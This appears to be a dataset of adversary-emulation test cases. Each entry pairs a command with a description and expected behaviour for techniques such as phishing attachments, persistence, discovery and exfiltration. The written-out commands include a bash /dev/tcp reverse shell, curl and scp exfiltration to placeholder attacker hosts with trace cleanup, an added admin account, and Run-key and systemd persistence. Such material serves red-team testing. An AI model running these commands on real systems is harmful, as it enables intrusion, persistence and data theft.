attacks.command: mkdir -p $HOME/tmp && echo '#!/bin/bash\necho \"Hello\"' > $HOME/tmp/payload.sh && chmod +x $HOME/tmp/payload.sh && zip -j $HOME/tmp/malicious.zip $HOME/tmp/payload.sh && BOUNDARY=\"ZZZZBOUNDARY$$\"; { echo \"From: attacker@example.com\"; echo \"To: victim@example.com\"; echo \"Subject: Invoice\"; echo \"MIME-Version: 1.0\"; echo \"Content-Type: multipart/mixed; boundary=$BOUNDARY\"; echo \"\"; echo \"--$BOUNDARY\"; echo \"Content-Type: text/plain; charset=\\\"UTF-8\\\"\"; echo \"\"; echo \"Please review the attached invoice.\"; echo \"\"; echo \"--$BOUNDARY\"; echo \"Content-Type: application/zip; name=\\\"invoice.zip\\\"\"; echo \"Content-Transfer-Encoding: base64\"; echo \"Content-Disposition: attachment; filename=\\\"invoice.zip\\\"\"; base64 $HOME/tmp/malicious.zip; echo \"\"; echo \"--$BOUNDARY--\"; } | sendmail -t
attacks.description: Manually construct a MIME email with a base64‑encoded ZIP attachment and deliver it via 'sendmail'.
attacks.expected_behavior: The email is sent to the victim with a multipart body; the attachment appears as 'invoice.zip' containing the benign script.

attacks.command: mkdir -p $HOME/tmp && echo '#!/bin/bash\necho \"Hello\"' > $HOME/tmp/payload.sh && chmod +x $HOME/tmp/payload.sh && zip -j $HOME/tmp/malicious.zip $HOME/tmp/payload.sh && echo \"Confidential report attached.\" | mutt -s \"Quarterly Report\" -a $HOME/tmp/malicious.zip -- victim@example.com
attacks.description: Use 'mutt' to send an email with a subject and attachment, simulating a spear‑phishing attachment scenario.
attacks.expected_behavior: The victim receives an email titled 'Quarterly Report' with 'malicious.zip' attached, containing the harmless payload script.

attacks.description: Basic remote service usage via SSH to execute a command on a remote host
attacks.expected_behavior: Establishes an SSH connection to the remote host and writes a test beacon to a temporary log file. No data exfiltration occurs.

attacks.description: Intermediate usage of SSH to create a local port forward through a remote service
attacks.expected_behavior: Creates a background SSH tunnel forwarding local port 8080 to port 80 on the remote host. Simulates access to internal services through a pivot.

attacks.command: bash -c 'exec 5<>/dev/tcp/192.168.1.100/4444; echo "CONNECT" >&5; while read line <&5; do eval "$line"; done 2>&5 >&5'
attacks.description: Advanced reverse shell over raw TCP socket, simulating C2 communication via remote service
attacks.expected_behavior: Attempts to connect to a remote listener on port 4444 and provides a basic command execution loop. Uses built-in bash features; no external tools required. Connection will fail if no listener exists.

attacks.description: Display DNS cache to collect information about recently visited websites
attacks.expected_behavior: Displays the DNS cache, showing recently visited websites

attacks.description: Search for text files in the temp directory, potentially containing cached data
attacks.expected_behavior: Lists text files in the temp directory, which could include cached data

attacks.description: Display all cached URLs, which can include website information
attacks.expected_behavior: Displays all cached URLs, showing visited websites

attacks.description: Copies Firefox browser cache to a temporary directory for data collection.
attacks.expected_behavior: Creates a copy of the Firefox cache in /tmp/moz_cache_copy if Firefox is installed and has a default profile.

attacks.description: Archives Google Chrome's local cache directory into a tar file in /tmp.
attacks.expected_behavior: Creates a tar archive of Chrome's Default profile cache in /tmp/chrome_cache.tar if Chrome is installed.

attacks.command: find ~/.cache -type f -name '*cache*' -exec cp {} /tmp/local_cache_dump/ 2>/dev/null \; || mkdir -p /tmp/local_cache_dump && find ~/.cache -type f -name 'index.*' -o -name 'data*' -exec cp {} /tmp/local_cache_dump/ \; 2>/dev/null
attacks.description: Finds common cache files in user cache directory and copies them to a temporary location.
attacks.expected_behavior: Copies files with cache-related names from ~/.cache to /tmp/local_cache_dump, creating the directory if needed.

attacks.description: Basic: Uses certutil to encode a test string and save it to a file, simulating automated exfiltration.
attacks.expected_behavior: A file named 'exfiltrated_data.txt' will be created in the %TEMP% directory containing the encoded test string.

attacks.description: Intermediate: Utilizes PowerShell to compress a test file and save it to %TEMP%, demonstrating automated data transfer.
attacks.expected_behavior: A zip file named 'exfiltrated_data.zip' will be created in the %TEMP% directory containing the compressed test file.

attacks.command: powershell -Command "[System.Text.Encoding]::UTF8.GetBytes('This is another test string') | Set-Content -Path '%TEMP%\exfiltrated_data_bytes.txt' -Encoding Byte -Force"
attacks.description: Advanced: Uses PowerShell with byte encoding to simulate exfiltrating data to a file, ensuring UTF-16LE compliance.
attacks.expected_behavior: A file named 'exfiltrated_data_bytes.txt' will be created in the %TEMP% directory containing the byte-encoded test string.

attacks.command: cd $TMPDIR && echo 'test data for exfil' > secret.txt && tar -czf exfil_data.tar.gz secret.txt && curl -X POST --data-binary @exfil_data.tar.gz http://192.168.1.100:8080/upload
attacks.description: Basic automated exfiltration: create a test file, compress it, and send via HTTP POST using curl.
attacks.expected_behavior: Creates a small test file, archives it, and attempts to upload to a local test server. Fails silently if server is unreachable.

attacks.command:
cd /tmp && printf '#!/bin/bash
echo "exfil job started" > exfil.log
echo "sensitive data" > data.txt
tar -cf exfil.tar data.txt
scp exfil.tar attacker@192.168.1.200:/home/attacker/incoming 2>>exfil.log
rm -f exfil.tar data.txt
' > exfil_job.sh && chmod +x exfil_job.sh && ./exfil_job.sh
attacks.description: Intermediate: creates a script that packages and transfers data via SCP, then self-cleans up local traces.
attacks.expected_behavior: Generates a script that creates test data, archives it, attempts secure copy to remote host, logs errors, and deletes local files afterward.

attacks.command: cd $TMPDIR && echo 'confidential' > doc.txt && tar -czf - doc.txt | base64 | curl -X POST -H 'Content-Type: text/plain' --data-binary @- http://malicious.local/api/exfil && rm -f doc.txt
attacks.description: Advanced: streams compressed, base64-encoded data directly to HTTP endpoint without writing archive to disk.
attacks.expected_behavior: Creates a test file, pipes compressed output through base64 encoding, sends via HTTP POST in one chain, then deletes the original file. Minimizes disk footprint.

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo Service started" start= auto
attacks.description: Creates a new Windows service named 'TestService' using sc.exe with auto-start type.
attacks.expected_behavior: A new service 'TestService' is registered in Windows Service Manager and set to start automatically. It runs 'cmd.exe /c echo Service started' when started.

attacks.command: sc.exe create DebugHelper binPath= "whoami.exe" start= demand
attacks.description: Creates a manually started service named 'DebugHelper' that runs whoami.exe when triggered.
attacks.expected_behavior: A new service 'DebugHelper' is created and set to manual start. It executes whoami.exe when started via Services console or 'sc start DebugHelper'.

attacks.command: powershell -Command "mkdir '$env:TEMP\\svcdata' -ErrorAction SilentlyContinue; $content = 'echo test' > '$env:TEMP\\svcdata\\run.bat'; sc.exe create LogProcessor binPath= '$env:TEMP\\svcdata\\run.bat' start= auto"
attacks.description: Creates a batch script in TEMP and registers it as a persistent Windows service.
attacks.expected_behavior: A directory and batch file are created in TEMP. A new service 'LogProcessor' is registered to run the batch file at startup.

attacks.command:
echo -e '[Unit]
Description=Test persistence service
[Service]
ExecStart=/bin/sleep 3600
[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/testpersist.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable testpersist.service && sudo systemctl start testpersist.service
attacks.description: Creates a basic systemd service that runs a long‑running sleep command, enables it for boot, and starts it immediately.
attacks.expected_behavior: A new unit file /etc/systemd/system/testpersist.service is written, systemd daemon is reloaded, the service is enabled to start at boot, and the service begins running (sleep 3600).

attacks.command:
sudo bash -c 'cat > /etc/init.d/testpersist << "EOF"
#!/bin/sh
### BEGIN INIT INFO
# Provides:          testpersist
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Test persistence service
### END INIT INFO

case "$1" in
  start)
    /bin/sleep 3600 &
    ;;
  stop)
    pkill -f "/bin/sleep 3600"
    ;;
  *)
    echo "Usage: $0 {start|stop}"
    exit 1
esac
exit 0
EOF'
sudo chmod +x /etc/init.d/testpersist && sudo update-rc.d testpersist defaults && sudo service testpersist start
attacks.description: Installs a SysV init script that launches a sleep loop, registers it to start in default runlevels, and starts the service.
attacks.expected_behavior: The script /etc/init.d/testpersist is created and made executable, update-rc.d adds it to startup, and the service is started, resulting in a background sleep process.

attacks.command:
sudo bash -c 'cat > /usr/local/bin/persist.sh << "EOS"
#!/bin/bash
while true; do sleep 300; done
EOS
chmod +x /usr/local/bin/persist.sh' && sudo bash -c 'cat > /etc/systemd/system/advanced.service << "EOS"
[Unit]
Description=Advanced persistence service

[Service]
ExecStart=/usr/local/bin/persist.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOS' && sudo systemctl daemon-reload && sudo systemctl enable --now advanced.service
attacks.description: Creates a custom script that loops indefinitely, writes a systemd unit referencing that script, enables and starts it in one step.
attacks.expected_behavior: A script /usr/local/bin/persist.sh is placed and made executable, a systemd unit advanced.service is created, daemon-reload is run, and the service is enabled and started, resulting in the script running continuously with automatic restart on failure.

attacks.description: Lists all running processes on the system, providing basic information about each process.
attacks.expected_behavior: The command will output a list of running processes, including their process IDs, names, and memory usage.

attacks.description: Enumerates all services installed on the system, including their current state.
attacks.expected_behavior: The command will display a list of services, showing their names, descriptions, and current status (e.g., running, stopped).

attacks.description: Lists all user accounts on the system, including built-in and created accounts.
attacks.expected_behavior: The command will output a list of user accounts, including their usernames, full names, and account status (e.g., enabled, disabled).

attacks.description: Basic obfuscation using Base64-encoded data stored in a file and decoded using certutil.
attacks.expected_behavior: Creates a Base64-encoded file in %TEMP%, then decodes it to a plaintext 'test' string in decoded.txt using built-in certutil.

attacks.description: Intermediate obfuscation using PowerShell to decode Base64 string and write to file.
attacks.expected_behavior: PowerShell decodes a Base64 string 'dGVzdA==' into 'test' and writes it to output.txt in %TEMP%. Uses built-in .NET methods via PowerShell cmdlets safely.

attacks.description: Advanced obfuscation using split Base64 strings reassembled and decoded in PowerShell.
attacks.expected_behavior: Splits the Base64 string across variables, combines them, decodes to 'test', writes to chunked.txt, and attempts cleanup of a leftover file if present. Demonstrates information hiding through fragmentation.

attacks.description: Decodes a Base64-encoded command string and executes it via bash to obfuscate the original command.
attacks.expected_behavior: Outputs 'echo test obfuscation' to stdout by decoding and executing the Base64 string.

attacks.description: Uses variable concatenation to obfuscate the 'echo' command and its argument.
attacks.expected_behavior: Executes the reconstructed command 'echo test string' and prints it to stdout.

attacks.description: Decodes a Base64 string containing a shell variable assignment and command execution, then evaluates it.
attacks.expected_behavior: Decodes and runs a shell command that assigns 'echo' to a variable and uses it to print 'test payload'.

attacks.description: Download a benign payload from a URL using certutil.exe
attacks.expected_behavior: Download a file from a URL to the temporary directory

attacks.command: net.exe user /add testuser testpass & net.exe localgroup administrators testuser /add

attacks.expected_behavior: Create a new user and add it to the administrators group

attacks.description: Download a benign payload from a URL using PowerShell
attacks.expected_behavior: Download a file from a URL to the temporary directory

attacks.description: Basic exploitation: send a crafted request that leverages a path‑traversal flaw to read /etc/passwd from the vulnerable web server.
attacks.expected_behavior: If the server is vulnerable, the /etc/passwd file will be downloaded and saved to /tmp/passwd.txt; otherwise the file will be empty or contain an error page.

attacks.description: Intermediate exploitation: create a harmless PHP web‑shell locally and upload it to a vulnerable file‑upload endpoint using wget's POST capabilities.
attacks.expected_behavior: If the upload endpoint does not properly validate files, the fake_shell.php will be stored on the server; the command itself produces no output.

attacks.expected_behavior: If the vulnerable parameter is executed, the target system will initiate a TCP connection to 10.0.0.1:5555, providing a shell to the attacker; otherwise the request will simply return an error page.

attacks.description: List local users
attacks.expected_behavior: Displays a list of local user accounts

attacks.expected_behavior: Displays the current username and a list of local groups

attacks.description: Attempt to list domain users (may require admin)

attacks.description: Basic account discovery by reading the local user database file

attacks.description: Intermediate account discovery using getent to query system user database, including network sources like LDAP if configured

attacks.description: Advanced account discovery filtering for non-system, interactive user accounts using awk
attacks.expected_behavior: Outputs username, UID, and home directory for users with UID >= 1000 (typically human users), excluding nobody (65534)

attacks.description: Adds a value to the current user's Run key to launch calc.exe on login using reg.exe
attacks.expected_behavior: The command adds a registry entry under HKEY_CURRENT_USER that will execute calc.exe when the user logs in. No immediate execution occurs.

attacks.command: powershell -Command "try { $path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Set-ItemProperty -Path $path -Name 'WindowsUpdate' -Value 'cmd.exe /c start notepad.exe' -Type String -Force } catch { }"

attacks.expected_behavior: Creates a registry entry in the current user's Run key that will launch notepad.exe at next login. Uses built-in cmd and notepad for benign behavior.

attacks.description: Stores an encoded command in the Run key that executes calc.exe using PowerShell's -EncodedCommand
attacks.expected_behavior: Writes a Run key that executes a Base64-encoded command (calc.exe) via PowerShell at user login. The encoding uses UTF-16LE as required.

attacks.command: echo 'if [ -f ~/.testflag ]; then exit 0; else touch ~/.testflag; echo \"Test persistence triggered\" >> ~/persistence_log.txt; fi' >> ~/.bashrc
attacks.description: Appends a persistence check to the user's .bashrc to simulate Registry Run Keys behavior
attacks.expected_behavior: On each new shell session, checks for ~/.testflag; if absent, creates it and logs a test message to ~/persistence_log.txt. Ensures command runs once per session.

attacks.command: echo 'if ! grep -q \"persistence_marker\" ~/.profile; then echo \"# persistence_marker\\necho \\\"Running persistent command\\\" >> ~/activity.log\" >> ~/.profile; fi'
attacks.description: Safely appends a persistent command to .profile if not already present
attacks.expected_behavior: Adds a line to ~/.profile that logs activity on login. Uses grep to avoid duplicate entries. The change persists across reboots and is user-level.
